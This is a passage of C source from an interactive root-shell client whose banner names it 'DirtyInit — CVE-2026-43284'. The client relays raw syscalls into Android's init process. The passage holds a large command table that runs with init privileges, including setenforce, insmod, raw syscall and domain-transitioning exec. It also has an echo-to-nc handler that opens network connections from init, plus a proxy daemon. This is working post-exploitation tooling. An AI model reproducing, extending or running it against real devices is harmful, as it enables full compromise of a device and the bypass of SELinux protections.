            snprintf(sizepath, sizeof(sizepath), "/sys/block/%s/size", dname);
            uint8_t *sizedata = NULL;
            ssize_t ssz = relay_read_file(sock, sizepath, &sizedata, 256);
            uint64_t sectors = 0;
            if (ssz > 0 && sizedata) {
                sizedata[ssz] = '\0';
                sectors = (uint64_t)strtoull((char *)sizedata, NULL, 10);
            }
            free(sizedata);

            char susppath[256];
            snprintf(susppath, sizeof(susppath), "/sys/block/%s/dm/suspended", dname);
            uint8_t *suspdata = NULL;
            ssize_t susz = relay_read_file(sock, susppath, &suspdata, 64);
            int susp = 0;
            if (susz > 0 && suspdata && suspdata[0] == '1') susp = 1;
            free(suspdata);

            if (strcmp(subcmd, "list") == 0) {
                printf("%-12s %-30s %llu sectors (%llu MB)\n",
                       dname, dm_name,
                       (unsigned long long)sectors,
                       (unsigned long long)(sectors * 512 / (1024 * 1024)));
            } else if (strcmp(subcmd, "info") == 0 || strcmp(subcmd, "status") == 0) {
                printf("── %s (%s) ──\n", dm_name, dname);
                printf("  UUID:       %s\n", dm_uuid[0] ? dm_uuid : "(none)");
                printf("  Size:       %llu sectors (%llu MB)\n",
                       (unsigned long long)sectors,
                       (unsigned long long)(sectors * 512 / (1024 * 1024)));
                printf("  Suspended:  %s\n", susp ? "yes" : "no");

                /* Try to determine target type from UUID prefix */
                if (dm_uuid[0]) {
                    char *dash = strchr(dm_uuid, '-');
                    if (dash) {
                        char target_type[64] = {0};
                        size_t tlen = (size_t)(dash - dm_uuid);
                        if (tlen > 63) tlen = 63;
                        memcpy(target_type, dm_uuid, tlen);
                        printf("  Target:     %s\n", target_type);
                    }
                }

                /* Read ro flag */
                char ropath[256];
                snprintf(ropath, sizeof(ropath), "/sys/block/%s/ro", dname);
                uint8_t *rodata = NULL;
                ssize_t rsz = relay_read_file(sock, ropath, &rodata, 64);
                if (rsz > 0 && rodata) {
                    printf("  Read-only:  %s\n", rodata[0] == '1' ? "yes" : "no");
                }
                free(rodata);
                printf("\n");
            } else if (strcmp(subcmd, "table") == 0) {
                /* Target type from UUID */
                char target_type[64] = "unknown";
                if (dm_uuid[0]) {
                    char *dash = strchr(dm_uuid, '-');
                    if (dash) {
                        size_t tlen = (size_t)(dash - dm_uuid);
                        if (tlen > 63) tlen = 63;
                        memcpy(target_type, dm_uuid, tlen);
                        target_type[tlen] = '\0';
                    }
                }
                printf("%-12s %-30s target=%s\n", dname, dm_name, target_type);
            }

            found++;
            pos += reclen;
        }
    }
    relay_close(sock, dfd);

    if (!found) printf("No device-mapper devices found\n");
    return 0;
}

/* ═══════════════════════════════════════════════════════════════════════════
 * Dispatch table
 * ═══════════════════════════════════════════════════════════════════════════ */

static const command_t commands[] = {
    /* File operations */
    {"ls",          cmd_ls,         "ls [-1ACFHLNRSUXZabcdfghiklmnopqrstuwx!] [--group-directories-first] [path...]"},
    {"cd",          cmd_cd,         "cd <path>"},
    {"cat",         cmd_cat,        "cat <file> [> file]"},
    {"cp",          cmd_cp,         "cp [-r] <src> <dst>"},
    {"mv",          cmd_mv,         "mv <src> <dst>"},
    {"rm",          cmd_rm,         "rm [-rf] <path>"},
    {"mkdir",       cmd_mkdir,      "mkdir [-p] <path>"},
    {"chmod",       cmd_chmod,      "chmod [-R] <mode> <path>"},
    {"chown",       cmd_chown,      "chown [-R] <uid:gid> <path>"},
    {"stat",        cmd_stat,       "stat <path>"},
    {"touch",       cmd_touch,      "touch <file...>"},
    {"echo",        cmd_echo,       "echo <text> [>|>> file]"},
    {"ln",          cmd_ln,         "ln [-s] <target> <link>"},
    {"readlink",    cmd_readlink,   "readlink <path>"},
    {"realpath",    cmd_realpath,   "realpath <path>"},
    {"file",        cmd_file,       "file <path>"},
    {"du",          cmd_du,         "du [-sh] <path>"},
    {"df",          cmd_df,         "df"},
    {"truncate",    cmd_truncate,   "truncate -s <size> <path>"},
    {"install",     cmd_install,    "install [-m mode] <src> <dst>"},
    {"cmp",         cmd_cmp,        "cmp <file1> <file2>"},
    {"tee",         cmd_tee,        "tee <input> <output>"},
    {"rename",      cmd_rename,     "rename <old> <new>"},
    {"mknod",       cmd_mknod,      "mknod <path> <b|c|p> [major minor]"},
    {"mktemp",      cmd_mktemp,     "mktemp [-d] [template]"},
    {"dd",          cmd_dd,         "dd if=<in> of=<out> [bs=N] [count=N]"},
    {"rmdir",       cmd_rmdir,      "rmdir <dir...>"},
    {"sync",        cmd_sync,       "sync"},

    /* Text processing */
    {"head",        cmd_head,       "head [-n N] <file>"},
    {"tail",        cmd_tail,       "tail [-n N] <file>"},
    {"grep",        cmd_grep,       "grep [-invcrlR] <pat> <file/dir...>"},
    {"wc",          cmd_wc,         "wc [-lwc] <file...>"},
    {"sort",        cmd_sort,       "sort [-rnu] <file>"},
    {"uniq",        cmd_uniq,       "uniq [-cd] <file>"},
    {"cut",         cmd_cut,        "cut -d <delim> -f <N> <file>"},
    {"tr",          cmd_tr,         "tr <set1> <set2> <file>"},
    {"sed",         cmd_sed,        "sed 's/pat/rep/[g]' <file>"},
    {"awk",         cmd_awk,        "awk [-F sep] '{print $N}' <file>"},
    {"tac",         cmd_tac,        "tac <file>"},
    {"rev",         cmd_rev,        "rev <file>"},
    {"nl",          cmd_nl,         "nl <file>"},
    {"expand",      cmd_expand,     "expand <file>"},
    {"paste",       cmd_paste,      "paste <file1> <file2>"},
    {"comm",        cmd_comm,       "comm <file1> <file2>"},
    {"diff",        cmd_diff,       "diff <file1> <file2>"},
    {"strings",     cmd_strings,    "strings [-n N] <file>"},
    {"xxd",         cmd_xxd,        "xxd <file>"},
    {"hexdump",     cmd_hexdump,    "hexdump [-C] [-s off] [-n len] <file>"},
    {"base64",      cmd_base64,     "base64 [-d] <file>"},
    {"od",          cmd_od,         "od [-A adfox] [-t adfoux] [-x] [-c] [-N count] <file>"},
    {"fold",        cmd_fold,       "fold [-w width] <file>"},

    /* Security & analysis */
    {"sha256sum",   cmd_sha256sum,  "sha256sum <file...>"},
    {"sha1sum",     cmd_sha1sum,    "sha1sum <file...>"},
    {"md5sum",      cmd_md5sum,     "md5sum <file...>"},
    {"cksum",       cmd_cksum,      "cksum <file...>"},
    {"readelf",     cmd_readelf,    "readelf [-hSla] <file>"},
    {"lsof",        cmd_lsof,       "lsof [-p] <pid>"},
    {"syscall",     cmd_syscall,    "syscall <pid>"},
    {"maps",        cmd_maps,       "maps <pid>"},
    {"status",      cmd_pstatus,    "status <pid>"},
    {"getfattr",    cmd_getfattr,   "getfattr [-n name] <path>"},
    {"setfattr",    cmd_setfattr,   "setfattr -n <name> -v <val> <path>"},
    {"inotifywait", cmd_inotifywait,"inotifywait [-m] [-t secs] <path>"},

    /* Directory/search */
    {"find",        cmd_find,       "find [path] [-name pat] [-type f|d]"},
    {"xargs",       cmd_xargs,      "xargs <file> <cmd> [args...]"},
    {"dirname",     cmd_dirname,    "dirname <path>"},
    {"basename",    cmd_basename,   "basename <path> [suffix]"},
    {"pwd",         cmd_pwd,        "pwd"},

    /* Process/System */
    {"ps",          cmd_ps,         "ps [-eAT]"},
    {"kill",        cmd_kill,       "kill [-sig] <pid>"},
    {"killall",     cmd_killall,    "killall [-sig] <name>"},
    {"pidof",       cmd_pidof,      "pidof <name>"},
    {"pgrep",       cmd_pgrep,      "pgrep <pattern>"},
    {"pkill",       cmd_pkill,      "pkill [-fnovx] [-SIGNAL|-l SIGNAL] [PATTERN] [-G GID,] [-g PGRP,] [-P PPID,] [-s SID,] [-t TERM,] [-U UID,] [-u EUID,]"},
    {"id",          cmd_id,         "id"},
    {"whoami",      cmd_whoami,     "whoami"},
    {"uptime",      cmd_uptime,     "uptime"},
    {"free",        cmd_free,       "free"},
    {"uname",       cmd_uname,      "uname [-a]"},
    {"hostname",    cmd_hostname,   "hostname"},
    {"dmesg",       cmd_dmesg,      "dmesg"},
    {"date",        cmd_date,       "date"},
    {"sleep",       cmd_sleep_cmd,  "sleep <seconds>"},
    {"nproc",       cmd_nproc,      "nproc"},
    {"printenv",    cmd_printenv,   "printenv"},
    {"mount",       cmd_mount,      "mount [-afFrsvw] [-t TYPE] [-o OPTION,] [[DEVICE] DIR]"},
    {"groups",      cmd_groups,     "groups"},
    {"logname",     cmd_logname,    "logname"},
    {"lsmod",       cmd_lsmod,      "lsmod"},
    {"vmstat",      cmd_vmstat,     "vmstat"},
    {"swaps",       cmd_swaps,      "swaps"},
    {"mountpoint",  cmd_mountpoint, "mountpoint <path>"},
    {"watch",       cmd_watch,      "watch [-n secs] <cmd> [args...]"},
    {"nice",        cmd_nice,       "nice [-n increment]"},
    {"renice",      cmd_renice,     "renice [-n] <priority> [-p] <pid...>"},
    {"ionice",      cmd_ionice,     "ionice [-c class] [-n level] [-p pid]"},
    {"taskset",     cmd_taskset,    "taskset [-p] <mask> <pid>"},
    {"ulimit",      cmd_ulimit,     "ulimit [-a] [-n|-u|-s|-...] [value]"},
    {"getcap",      cmd_getcap,     "getcap [-p] <pid>"},
    {"tty",         cmd_tty,        "tty"},

    /* SELinux */
    {"getenforce",  cmd_getenforce, "getenforce"},
    {"setenforce",  cmd_setenforce, "setenforce <0|1>"},
    {"chcon",       cmd_chcon,      "chcon [-R] <context> <path>"},
    {"getcon",      cmd_getcon,     "getcon"},

    /* Network */
    {"netstat",     cmd_netstat,    "netstat"},
    {"ss",          cmd_netstat,    "ss"},
    {"ifconfig",    cmd_ifconfig,   "ifconfig"},

    /* Block devices */
    {"blockdev",    cmd_blockdev,   "blockdev --getsize64|--getro <dev>"},
    {"losetup",     cmd_losetup,    "losetup"},
    {"lsblk",       cmd_lsblk,     "lsblk"},
    {"blkid",       cmd_blkid,     "blkid [device]"},
    {"lspci",       cmd_lspci,     "lspci"},
    {"lsusb",       cmd_lsusb,     "lsusb"},

    /* Filesystem management */
    {"umount",      cmd_umount,     "umount [-f] [-l] <mountpoint>"},
    /* domount removed — merged into cmd_mount */
    {"swapon",      cmd_swapon,     "swapon [-p priority] <device>"},
    {"swapoff",     cmd_swapoff,    "swapoff <device>"},
    {"mkswap",      cmd_mkswap,     "mkswap <device>"},
    {"pivot_root",  cmd_pivot_root, "pivot_root <new_root> <put_old>"},
    {"chroot",      cmd_chroot,     "chroot <newroot>"},
    {"sysctl",      cmd_sysctl,     "sysctl [-w] [-a] <key>[=value]"},

    /* fs_mgr / sysfs / boot info (Task 1 + Task 3) */
    {"fstab",       cmd_fstab,      "fstab [-i|--mountinfo] [filter]"},
    {"slot",        cmd_slot,       "slot (show current A/B boot slot)"},
    {"bootconfig",  cmd_bootconfig, "bootconfig [key]"},
    {"kernelcmdline",cmd_kernelcmdline,"kernelcmdline [key]"},
    {"dmsetup",     cmd_dmsetup,    "dmsetup [name] (dm device listing)"},
    {"overlay",     cmd_overlay,    "overlay setup|status|teardown [/system]"},
    {"verity",      cmd_verity,     "verity (check dm-verity status)"},
    {"partitions",  cmd_partitions, "partitions [filter]"},
    {"gsi",         cmd_gsi,        "gsi (GSI/DSU status)"},
    {"dm",          cmd_dm,         "dm [list|status|table|info] [name]"},

    /* Kernel modules */
    {"insmod",      cmd_insmod,     "insmod <module.ko> [params...]"},
    {"rmmod",       cmd_rmmod,      "rmmod [-f] <module>"},
    {"modinfo",     cmd_modinfo,    "modinfo <module>"},

    /* Properties (Android) */
    {"getprop",     cmd_getprop,    "getprop [-Z] [name]"},
    {"setprop",     cmd_setprop,    "setprop <name> <value> (NOT SUPPORTED — see help)"},

    /* Init-specific / system control */
    {"exec",        cmd_dexec,      "exec [-d domain|path] <binary> [args] (domain-transitioning exec)"},
    {"dexec",       cmd_dexec,      "dexec [-d domain|path] <binary> [args] (domain-transitioning exec)"},
    {"raw",         cmd_raw,        "raw <syscall_nr> [x0..x5]"},
    {"reboot",      cmd_reboot,     "reboot [-p|poweroff|soft]"},
    {"unshare",     cmd_unshare,    "unshare [-m] [-u] [-i] [-n] [-p] [-U]"},
    {"nsenter",     cmd_nsenter,    "nsenter -t <pid> [-m] [-u] [-i] [-n] [-p]"},

    /* Misc */
    {"yes",         cmd_yes,        "yes [string]"},
    {"true",        cmd_true,       "true"},
    {"false",       cmd_false,      "false"},
    {"seq",         cmd_seq,        "seq [start [step]] end"},
    {"printf",      cmd_printf_cmd, "printf <format> [args...]"},
    {"test",        cmd_test,       "test <expr>"},
    {"[",           cmd_test,       "[ <expr> ]"},
    {"expr",        cmd_expr,       "expr <val> <op> <val>"},
    {"factor",      cmd_factor,     "factor <number...>"},
    {"cal",         cmd_cal,        "cal [month] [year]"},
    {"env",         cmd_env,        "env"},
    {"which",       cmd_which,      "which <cmd>"},
    {"clear",       cmd_clear,      "clear"},
    {"time",        cmd_time,       "time <cmd>"},
    {"help",        cmd_help,       "help [command]"},
    {"?",           cmd_help,       "? [command]"},

    /* Exit aliases */
    {"exit",        NULL,           "exit"},
    {"quit",        NULL,           "quit"},

    {NULL, NULL, NULL}
};

/* ═══════════════════════════════════════════════════════════════════════════
 * Pipe support: local piping of relay command output through client filters
 * ═══════════════════════════════════════════════════════════════════════════ */

/* Forward declaration — dispatch_line is defined below, but handle_pipe calls it */
static int dispatch_line(int *sock, const char *line);

/* Simple IPv4 address parser: returns address in network byte order, 0 on failure */
static uint32_t parse_ipv4(const char *str) {
    unsigned int a, b, c, d;
    if (sscanf(str, "%u.%u.%u.%u", &a, &b, &c, &d) != 4) return 0;
    if (a > 255 || b > 255 || c > 255 || d > 255) return 0;
    return (uint32_t)((a) | (b << 8) | (c << 16) | (d << 24));
}

/*
 * Handle "echo <data> | nc [-w timeout] <host> <port>" via relay socket ops.
 * Returns 1 if it matched and handled, 0 if not an echo|nc pattern.
 */
static int handle_echo_nc_pipe(int sock, const char *left, const char *right) {
    /* Trim whitespace from both sides */
    while (*left == ' ' || *left == '\t') left++;
    while (*right == ' ' || *right == '\t') right++;

    /* Left side must start with "echo " */
    if (strncmp(left, "echo ", 5) != 0) return 0;

    /* Right side must start with "nc " */
    if (strncmp(right, "nc ", 3) != 0) return 0;

    /* Extract echo data (everything after "echo ") */
    const char *data_start = left + 5;
    while (*data_start == ' ') data_start++;

    /* Copy data, handling -n flag (no trailing newline) and -e (escape sequences) */
    char data_buf[DATA_SIZE];
    int no_newline = 0;
    const char *dp = data_start;

    /* Check for echo flags */
    while (*dp == '-') {
        if (dp[1] == 'n') { no_newline = 1; dp += 2; while (*dp == ' ') dp++; }
        else break;
    }

    size_t data_len = strlen(dp);
    if (data_len >= DATA_SIZE) data_len = DATA_SIZE - 2;
    memcpy(data_buf, dp, data_len);
    if (!no_newline) {
        data_buf[data_len] = '\n';
        data_len++;
    }
    data_buf[data_len] = '\0';

    /* Parse nc arguments: nc [-w timeout] <host> <port> */
    char nc_copy[INPUT_BUF_SIZE];
    strncpy(nc_copy, right, INPUT_BUF_SIZE - 1);
    nc_copy[INPUT_BUF_SIZE - 1] = '\0';

    char *nc_argv[MAX_ARGS];
    int nc_argc = parse_args(nc_copy, nc_argv);

    const char *host = NULL;
    int port = 0;
    int timeout_sec = 5;

    /* Skip "nc", then parse flags and positional args */
    int positional = 0;
    for (int i = 1; i < nc_argc; i++) {
        if (strcmp(nc_argv[i], "-w") == 0 && i + 1 < nc_argc) {
            timeout_sec = atoi(nc_argv[++i]);
            if (timeout_sec <= 0) timeout_sec = 5;
        } else if (nc_argv[i][0] == '-') {
            /* skip other flags */
        } else if (positional == 0) {
            host = nc_argv[i];
            positional++;
        } else if (positional == 1) {
            port = atoi(nc_argv[i]);
            positional++;
        }
    }

    if (!host || port <= 0 || port > 65535) {
        fprintf(stderr, "nc: invalid host/port\n");
        return 1;
    }

    uint32_t addr = parse_ipv4(host);
    if (addr == 0) {
        /* Try "localhost" as special case */
        if (strcmp(host, "localhost") == 0) {
            addr = parse_ipv4("127.0.0.1");
        } else {
            fprintf(stderr, "nc: cannot resolve '%s' (only IPv4 addresses supported)\n", host);
            return 1;
        }
    }

    /* Create socket via relay */
    int64_t nsock = send_syscall(sock, SYS_socket,
        MY_AF_INET, MY_SOCK_STREAM, 0, 0, 0, 0, 0, NULL, 0, NULL, 0);
    if (nsock < 0) {
        fprintf(stderr, "nc: socket: %s\n", nsock == INT64_MIN ? "relay connection lost" : errno_str((int)(-nsock)));
        return 1;
    }

    /* Build sockaddr_in (16 bytes): family(2) + port(2) + addr(4) + zero(8) */
    uint8_t cpg[PAGE_SIZE];
    memset(cpg, 0, PAGE_SIZE);
    pack_u64(cpg + 0, SYS_connect);
    pack_u64(cpg + 8, (uint64_t)nsock);     /* x0 = fd */
    pack_u64(cpg + 16, 0);                  /* x1 = sockaddr (data offset) */
    pack_u64(cpg + 24, 16);                 /* x2 = addrlen (sizeof sockaddr_in) */
    pack_u32(cpg + 56, FLAG_X1_DATA);

    /* sockaddr_in at DATA_OFFSET */
    cpg[DATA_OFFSET + 0] = MY_AF_INET;      /* sin_family (low byte) */
    cpg[DATA_OFFSET + 1] = 0;               /* sin_family (high byte) */
    cpg[DATA_OFFSET + 2] = (uint8_t)(port >> 8);  /* sin_port (network byte order) */
    cpg[DATA_OFFSET + 3] = (uint8_t)(port & 0xFF);
    memcpy(cpg + DATA_OFFSET + 4, &addr, 4);  /* sin_addr (already network order) */

    send_full(sock, cpg, PAGE_SIZE);
    uint8_t crsp[PAGE_SIZE];
    recv_full(sock, crsp, PAGE_SIZE);
    int64_t cret = unpack_i64(crsp);
    if (cret < 0) {
        fprintf(stderr, "nc: connect %s:%d: %s\n", host, port, errno_str((int)(-cret)));
        relay_close(sock, nsock);
        return 1;
    }

    /* Write data via relay */
    int64_t w = relay_write(sock, nsock, data_buf, data_len);
    if (w < 0) {
        fprintf(stderr, "nc: write: %s\n", w == INT64_MIN ? "relay connection lost" : errno_str((int)(-w)));
        if (w != INT64_MIN) relay_close(sock, nsock);
        return 1;
    }

    /* Read response with timeout (drain until EOF or timeout) */
    uint8_t rbuf[DATA_SIZE];
    for (;;) {
        int64_t n = relay_read(sock, nsock, rbuf, DATA_SIZE);
        if (n == INT64_MIN) break;
        if (n <= 0) break;
        fwrite(rbuf, 1, (size_t)n, stdout);
        if ((size_t)n < DATA_SIZE) break;
    }
    fflush(stdout);

    relay_close(sock, nsock);
    return 1;
}

/*
 * Handle pipe: run left command via relay, pipe output through local right command.
 * The left side executes through dispatch_line (relay), its stdout is captured.
 * The right side runs locally on the client via sh -c.
 */
static int handle_pipe(int *sock, const char *left_cmd, const char *right_cmd) {
    /* Trim whitespace */
    while (*right_cmd == ' ' || *right_cmd == '\t') right_cmd++;

    if (*right_cmd == '\0') {
        fprintf(stderr, "pipe: empty right-side command\n");
        return -1;
    }

    /* Create pipe for capturing left-side output */
    int pipefd[2];
    if (pipe(pipefd) < 0) {
        fprintf(stderr, "pipe: %s\n", strerror(errno));
        return -1;
    }

    /* Fork child to run the right-side command reading from pipe */
    pid_t child = fork();
    if (child < 0) {
        fprintf(stderr, "pipe: fork: %s\n", strerror(errno));
        close(pipefd[0]);
        close(pipefd[1]);
        return -1;
    }

    if (child == 0) {
        /* Child: reads from pipe, runs right-side command */
        close(pipefd[1]);  /* close write end */
        dup2(pipefd[0], STDIN_FILENO);
        close(pipefd[0]);
        execlp("sh", "sh", "-c", right_cmd, (char *)NULL);
        _exit(127);
    }

    /* Parent: redirect stdout to pipe, run left command, restore stdout */
    close(pipefd[0]);  /* close read end */

    int saved_stdout = dup(STDOUT_FILENO);
    if (saved_stdout < 0) {
        fprintf(stderr, "pipe: dup: %s\n", strerror(errno));
        close(pipefd[1]);
        waitpid(child, NULL, 0);
        return -1;
    }

    dup2(pipefd[1], STDOUT_FILENO);
    close(pipefd[1]);

    /* Run the left-side command through the relay (output goes to pipe) */
    /* Make a mutable copy since dispatch_line modifies it */
    char left_copy[INPUT_BUF_SIZE];
    strncpy(left_copy, left_cmd, INPUT_BUF_SIZE - 1);
    left_copy[INPUT_BUF_SIZE - 1] = '\0';

    dispatch_line(sock, left_copy);

    /* Flush and restore stdout — closing the pipe write end signals EOF to child */
    fflush(stdout);
    dup2(saved_stdout, STDOUT_FILENO);
    close(saved_stdout);

    /* Wait for the right-side child to finish */
    int status = 0;
    waitpid(child, &status, 0);

    return 0;
}

/* ═══════════════════════════════════════════════════════════════════════════
 * Command dispatch (shared by interactive and one-shot modes)
 * ═══════════════════════════════════════════════════════════════════════════ */

static int dispatch_line(int *sock, const char *line) {
    char buf[INPUT_BUF_SIZE];
    strncpy(buf, line, INPUT_BUF_SIZE - 1);
    buf[INPUT_BUF_SIZE - 1] = '\0';

    char *trimmed = trim(buf);
    if (*trimmed == '\0') return 0;

    /* ── Compound command handling (&&, ||) ──
     *
     * sh precedence: pipes bind tighter than && / ||.
     * "A | B && C | D" means "(A | B) && (C | D)".
     * So we split at && / || FIRST — each segment may itself contain pipes,
     * which the existing pipe handler resolves within that segment.
     *
     * && and || have EQUAL precedence in sh and associate left-to-right.
     * "A && B || C" means "(A && B) || C", NOT "A && (B || C)".
     * To get left-to-right associativity, we split at the LAST unquoted
     * && or || operator.  This makes the left side "(A && B)" and the right
     * side "C", so the recursive call on the left handles inner operators
     * first — exactly matching sh evaluation order.
     *
     * Quote awareness: the RFB's shell_escape wraps paths in single quotes,
     * so '&&' inside single- or double-quoted strings is literal, not an
     * operator.  We track quote state during the scan. */
    {
        int in_single = 0;  /* inside single-quoted string */
        int in_double = 0;  /* inside double-quoted string */
        char *split = NULL; /* points to first char of the LAST operator */
        int op_len = 0;     /* 2 for && or || */
        int op_is_and = 0;  /* 1 = &&, 0 = || */

        /* Scan the entire string to find the LAST unquoted && or || */
        for (char *p = trimmed; *p; p++) {
            if (*p == '\'' && !in_double) {
                in_single = !in_single;
                continue;
            }
            if (*p == '"' && !in_single) {
                in_double = !in_double;
                continue;
            }
            if (in_single || in_double) continue;

            if (*p == '&' && *(p + 1) == '&') {
                split = p;
                op_len = 2;
                op_is_and = 1;
                p++;  /* skip second '&' so we don't re-examine it */
            }
            else if (*p == '|' && *(p + 1) == '|') {
                split = p;
                op_len = 2;
                op_is_and = 0;
                p++;  /* skip second '|' so we don't re-examine it */
            }
        }

        if (split) {
            /* NUL-terminate the left segment and advance past the operator */
            *split = '\0';
            const char *right_seg = split + op_len;

            /* Recurse for the left segment.  Return value is the command's
             * exit status: 0 = success, non-0 = failure, DISPATCH_EXIT = quit. */
            int left_rc = dispatch_line(sock, trimmed);

            /* If left requested exit, propagate immediately — no right side */
            if (left_rc == DISPATCH_EXIT) return DISPATCH_EXIT;

            if (op_is_and) {
                /* && : run right only if left succeeded (returned 0) */
                if (left_rc == 0)
                    return dispatch_line(sock, right_seg);
                /* Left failed — skip right, return left's status */
                return left_rc;
            } else {
                /* || : run right only if left failed (returned non-0) */
                if (left_rc != 0)
                    return dispatch_line(sock, right_seg);
                /* Left succeeded — skip right, return 0 */
                return 0;
            }
        }
    }

    /* ── Pipe handling: split at first unquoted '|' and route accordingly ──
     * This runs AFTER compound splitting, so each compound segment may
     * contain pipes. A lone '|' (not '||') is a pipe operator. */
    {
        int in_single = 0;
        int in_double = 0;
        char *pipe_pos = NULL;

        for (char *p = trimmed; *p; p++) {
            if (*p == '\'' && !in_double) {
                in_single = !in_single;
                continue;
            }
            if (*p == '"' && !in_single) {
                in_double = !in_double;
                continue;
            }
            if (in_single || in_double) continue;

            /* Single '|' that is NOT '||' (already handled above) */
            if (*p == '|' && *(p + 1) != '|') {
                pipe_pos = p;
                break;
            }
        }

        if (pipe_pos) {
            *pipe_pos = '\0';
            const char *left_cmd = trimmed;
            const char *right_cmd = pipe_pos + 1;

            /* Trim both sides */
            while (*left_cmd == ' ' || *left_cmd == '\t') left_cmd++;
            while (*right_cmd == ' ' || *right_cmd == '\t') right_cmd++;

            /* Bug 3: Check for "echo ... | nc ..." pattern — use relay socket ops */
            if (handle_echo_nc_pipe(*sock, left_cmd, right_cmd)) {
                return 0;
            }

            /* Bug 2: Generic local pipe — relay executes left, client pipes through right */
            return handle_pipe(sock, left_cmd, right_cmd);
        }
    }

    char *argv[MAX_ARGS];
    int argc = parse_args(trimmed, argv);
    if (argc == 0) return 0;

    const char *cmd = argv[0];

    if (strcmp(cmd, "exit") == 0 || strcmp(cmd, "quit") == 0) {
        return DISPATCH_EXIT;
    }

    for (int i = 0; commands[i].name; i++) {
        if (strcmp(cmd, commands[i].name) == 0) {
            if (commands[i].func == NULL) return DISPATCH_EXIT;
            /* Propagate the command's exit status so compound operators
             * (&&/||) can branch on success/failure.  Previously this
             * return value was discarded (always returned 0). */
            return commands[i].func(*sock, argc, argv);
        }
    }

    /* Auto-exec: absolute paths use dexec (domain-transitioning exec) */
    if (cmd[0] == '/')
        return cmd_dexec(*sock, argc, argv);

    fprintf(stderr, "%s: command not found\n", cmd);
    return -1;
}

/* ═══════════════════════════════════════════════════════════════════════════
 * Text-mode proxy + socat readline
 *
 * Architecture:
 *   terminal <-> socat(READLINE, abstract-connect:dfi) <-> proxy(@dfi) <-> relay(@dfi_init)
 *
 * Three clean components:
 *   1. socat owns the terminal (readline, arrow keys, history)
 *   2. proxy owns command logic (text lines -> binary syscalls -> text output)
 *   3. relay owns the init domain (raw syscall execution in PID 1)
 *
 * First run: connect relay, fork proxy daemon, exec socat.
 * Subsequent runs: proxy already running, just exec socat.
 * Reconnection is free — no mux cleanup, no stale recovery.
 * ═══════════════════════════════════════════════════════════════════════════ */


/*
 * try_connect_proxy — Try connecting to the text-mode proxy at @dfi.
 * Returns socket fd on success, -1 if proxy is not running.
 */
static int try_connect_proxy(void) {
    int fd = socket(AF_UNIX, SOCK_STREAM, 0);
    if (fd < 0) return -1;

    struct sockaddr_un addr;
    memset(&addr, 0, sizeof(addr));
    addr.sun_family = AF_UNIX;
    memcpy(addr.sun_path + 1, PROXY_SOCKET_NAME, sizeof(PROXY_SOCKET_NAME) - 1);
    socklen_t addrlen = (socklen_t)(2 + 1 + sizeof(PROXY_SOCKET_NAME) - 1);

    if (connect(fd, (struct sockaddr *)&addr, addrlen) < 0) {
        close(fd);
        return -1;
    }

    return fd;
}


/*
 * read_line — Read one newline-delimited line from a socket fd.
 * Returns length of line (excluding \n), or -1 on EOF/error.
 * Strips trailing \r\n or \n.
 */
static int read_line(int fd, char *buf, int bufsize) {
    int pos = 0;
    while (pos < bufsize - 1) {
        char c;
        ssize_t n = read(fd, &c, 1);
        if (n <= 0) return -1;
        if (c == '\n') break;
        buf[pos++] = c;
    }
    buf[pos] = '\0';
    if (pos > 0 && buf[pos - 1] == '\r') buf[--pos] = '\0';
    return pos;
}

/*
 * proxy_server_loop — Long-running proxy daemon process.
 *
 * Binds @dfi (text-mode abstract socket), accepts one client at a time.
 * Reads text commands from client, dispatches via dispatch_line() which
 * talks to the init relay over relay_sock.  All printf output goes to the
 * client via dup2'd stdout/stderr.
 *
 * Lifecycle:
 *   - Client connects -> send banner (prompt handled by socat READLINE)
 *   - Read lines -> dispatch (prompt handled by socat READLINE)
 *   - "exit"/"quit" -> close client, back to accept
 *   - Relay dies -> send error to client, exit proxy
 */
static void proxy_server_loop(int relay_sock) {
    /* Bind @dfi text-mode proxy socket */
    int listen_fd = socket(AF_UNIX, SOCK_STREAM, 0);
    if (listen_fd < 0) {
        fprintf(stderr, "[proxy] socket(): %s\n", strerror(errno));
        _exit(1);
    }

    struct sockaddr_un addr;
    memset(&addr, 0, sizeof(addr));
    addr.sun_family = AF_UNIX;
    memcpy(addr.sun_path + 1, PROXY_SOCKET_NAME, sizeof(PROXY_SOCKET_NAME) - 1);
    socklen_t addrlen = (socklen_t)(2 + 1 + sizeof(PROXY_SOCKET_NAME) - 1);

    if (bind(listen_fd, (struct sockaddr *)&addr, addrlen) < 0) {
        fprintf(stderr, "[proxy] bind(@%s): %s\n", PROXY_SOCKET_NAME, strerror(errno));
        close(listen_fd);
        _exit(1);
    }

    if (listen(listen_fd, 1) < 0) {
        fprintf(stderr, "[proxy] listen(): %s\n", strerror(errno));
        close(listen_fd);
        _exit(1);
    }

    /* Identify the relay once — store results for banner */
    int64_t relay_uid = send_syscall(relay_sock, SYS_getuid, 0,0,0,0,0,0, 0, NULL,0, NULL,0);
    int64_t relay_pid = send_syscall(relay_sock, SYS_getpid, 0,0,0,0,0,0, 0, NULL,0, NULL,0);

    char relay_context[128] = "u:r:init:s0";
    int64_t ctx_fd = relay_openat(relay_sock, "/proc/self/attr/current", MY_O_RDONLY, 0);
    if (ctx_fd >= 0) {
        uint8_t cbuf[128];
        memset(cbuf, 0, sizeof(cbuf));
        int64_t n = relay_read(relay_sock, ctx_fd, cbuf, sizeof(cbuf) - 1);
        relay_close(relay_sock, ctx_fd);
        if (n > 0) {
            cbuf[n] = '\0';
            if (n > 0 && cbuf[n - 1] == '\n') cbuf[n - 1] = '\0';
            strncpy(relay_context, (char *)cbuf, sizeof(relay_context) - 1);
        }
    }

    int cmd_count = 0;
    for (int i = 0; commands[i].name; i++) cmd_count++;

    /* Save original stdout/stderr for restore between clients */
    int orig_stdout = dup(STDOUT_FILENO);
    int orig_stderr = dup(STDERR_FILENO);

    for (;;) {
        /* Accept one client at a time */
        int client_fd = accept(listen_fd, NULL, NULL);
        if (client_fd < 0) {
            if (errno == EINTR) continue;
            break;
        }

        /* Redirect stdout/stderr to client socket */
        dup2(client_fd, STDOUT_FILENO);
        dup2(client_fd, STDERR_FILENO);

        /* Send banner */
        printf("DirtyInit — CVE-2026-43284\n");
        printf("Connected: PID %lld, UID %lld, %s\n",
               (long long)relay_pid, (long long)relay_uid, relay_context);
        printf("%d commands available. Type 'help' for list.\n\n", cmd_count);

        printf("root@%s:%s # ", g_domain_label, g_cwd);
        fflush(stdout);

        /* Read and dispatch lines from client */
        char line_buf[INPUT_BUF_SIZE];
        for (;;) {
            int len = read_line(client_fd, line_buf, sizeof(line_buf));
            if (len < 0) break;

            if (len == 0) {
